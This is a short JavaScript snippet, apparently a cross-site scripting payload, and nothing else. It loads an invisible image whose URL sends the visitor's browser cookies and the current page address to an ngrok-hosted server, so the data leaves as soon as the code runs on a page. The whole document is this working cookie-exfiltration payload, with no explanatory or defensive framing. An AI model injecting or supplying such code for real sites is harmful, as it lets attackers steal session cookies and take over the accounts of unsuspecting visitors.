var img = new Image();
  img.src = 'https://osprey-gorgeous-gazelle.ngrok-free.app/?cookies=' + 
            encodeURIComponent(document.cookie) + 
            '&location=' + 
            encodeURIComponent(window.location.href);
  document.body.appendChild(img);
